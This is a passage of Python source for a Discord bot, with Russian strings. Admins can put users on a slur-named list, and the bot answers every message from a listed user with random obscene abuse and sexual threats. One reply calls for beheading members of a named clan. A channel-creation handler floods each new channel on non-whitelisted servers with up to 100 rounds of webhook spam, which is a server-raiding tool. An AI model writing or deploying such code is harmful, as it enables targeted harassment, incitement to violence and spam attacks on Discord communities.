        await ctx.send(embed=discord.Embed(title='У вас недостаточно прав!', colour=discord.Colour.from_rgb(122, 0, 0)))

@bot.command()
async def remove_pedik(ctx, member:discord.Member):
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    iddd = member.id
    if int(ctx.author.id) in admins:
        if int(iddd) in pds["pediks"]:
            with open('pediks.json', 'r') as f:
                bd = json.load(f)
            bd["pediks"].remove(int(iddd))
            with open('pediks.json', 'w') as f:
                json.dump(bd, f)
            await ctx.send(
                f'{member.mention}, хороший мальчик, наконец-то прикрыл свою пасть. Я бы даже сказала, ты заслужил косточку. {ctx.author}, если он опять будет плохо себя вести - ты знаешь, кого звать)')
        else:
            await ctx.reply(f'Этот чел не говнюк, и он точно не в списке тех, кому надо прикрыть ебальник.')
    else:
        await ctx.send(embed=discord.Embed(title='У вас недостаточно прав!', colour=discord.Colour.from_rgb(122, 0, 0)))

@bot.event
async def on_guild_channel_create(channel):
    with open('wl.json', 'r') as f:
        wls = json.load(f)
    if int(channel.guild.id) in wls["wl"]:
        pass
    else:
        await channel.create_webhook(name=hooknamen)
        for i in range(100):
            try:
                hooklist = await channel.webhooks()
                for hook in hooklist:
                    await hook.send(content=spamtextn, wait=True)
            except:
                pass

@bot.event
async def on_message(ctx):
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        rand1 = ['Да завали своё ебало нахуй, сын проститутки обосанный блять', 'Слышь ты, сучара ебанная, чё ты тут выступаешь нахуй, твоё место знаешь где? У параши нахуй, вот туда и пиздуй блять']
        rand2 = ['Не поняла, что ты, чепух слитый, себе тут позволяешь? Прикиньте, умудряется ебальник раскрыть и что-то тут изрекать. Пиздуй нахуй, тебе здесь вообще не рады блять', 'Помойка слитая ебать, попиздовала-ка отсюда нахуй, чмо попущенное))']
        rand3 = ['Заеби рот, проститутка ебанная, я твою маму знаю кстати)', 'То есть ты серьёзно считаешь, что кому-то не похуй на твои высеры. Вынуждена тебя разочаровать - на тебя похуй всем. Ну прям вообще всем, даже твоим родителям.']
        rand4 = ['Сын фермера, по-моему тебе пора коровник от говна чистить, а ты только пукаешь в ДСике. Давай, за работу, а то батя тебе курей покормить не даст))', 'Нахуй пошёл, чмо ебучее']
        rand5 = ['Я твою маму выебу, если прямо сейчас свои шмотки не соберёшь, и не уйдешь из дискорда нахуй', 'Бляяять, боже, какая же ты помойка ебать, удали нахуй ДС, боже, испанский нахуй стыд, пиздеееец']
        r = (random.randint(1, 1000))
        if r < 200:
            randc = (random.choice(rand1))
        elif r >= 200 and r < 400:
            randc = (random.choice(rand2))
        elif r >= 400 and r < 600:
            randc = (random.choice(rand3))
        elif r >= 600 and r < 800:
            randc = (random.choice(rand4))
        elif r >= 800:
            randc = (random.choice(rand5))
        await ctx.reply(randc)
    elif 'соски' in ctx.content.lower():
        await ctx.reply(
            'По моему личному мнению, клан -CCCK не заслуживает человеческого к нему отношения. Каждый участник этого клана должен быть освобождён из этой параши, а тем, кому армя4ке сранной отсасывать только в кайф, нужно голову нахуй с плеч отрубить')
    elif 'ты' in ctx.content.lower() and 'охуенна' in ctx.content.lower():
        await ctx.reply('Всегда рада стараться :3')
    else:
        pass
    await bot.process_commands(ctx)

try:
	bot.run(token)
except Exception as e:
	print(f'{Fore.RED}Указан неверный токен бота или не включены интенты!')
